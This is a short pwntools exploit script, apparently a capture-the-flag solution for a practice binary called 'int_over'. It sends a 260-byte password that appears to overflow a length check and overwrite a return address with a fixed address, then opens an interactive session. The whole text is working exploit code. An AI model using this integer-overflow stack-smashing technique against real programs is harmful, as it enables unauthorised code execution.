from pwn import *
p = process("./int_over")
p.recv()
payload = b"1"
p.sendline(payload)
p.recvuntil(b"Please input your username")
payload1 = b"sss"
p.sendline(payload1)
p.recvuntil(b"Please input your passwd:")
data = b"a"*24 + p32(0x804868b)
payload2 = data.ljust(260,b"a")
p.sendline(payload2)
p.interactive()
